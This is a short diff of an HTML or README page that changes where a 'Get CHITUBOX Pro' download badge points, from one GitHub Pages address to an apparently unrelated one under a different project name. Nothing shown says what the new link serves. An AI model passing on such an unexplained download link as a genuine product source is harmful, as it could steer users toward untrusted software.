@@ -7,7 +7,7 @@
 </div>  
 
 <div align="center" style="margin:60px 0;">
-  <a href="https://chitubox-software.github.io/.github">
+  <a href="https://dbvisualizer.github.io/.github/">
     <img src="https://img.shields.io/badge/Get_CHITUBOX_Pro-4A90E2?style=for-the-badge" alt="Get CHITUBOX Pro"/>
   </a>
 </div>  
